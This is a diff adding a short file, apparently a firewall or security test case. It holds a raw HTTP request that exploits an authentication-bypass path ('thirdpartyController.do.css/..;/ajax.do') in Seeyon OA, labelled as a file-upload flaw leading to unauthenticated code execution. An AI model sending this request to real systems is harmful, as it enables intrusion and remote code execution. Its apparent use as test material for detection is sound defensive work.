@@ -1,0 +1,9 @@
+# 利用【致远 OA ajax.do 任意文件上传漏洞】-30000050
+# 致远OA存在一个漏洞，允许远程未经身份验证的攻击者上传任意文件到远程服务器，并导致执行任意代码。
+GET /seeyon/thirdpartyController.do.css/..;/ajax.do?acid=30000050&bid=hd_tag_m8mv24qu HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24qu
+RM-PRO-Token: d8d92f8eea7308a69c1bd677ef8e94f5
+RM-PRO-Time: 1742808406509
+User-Agent: curl/7.83.1
+
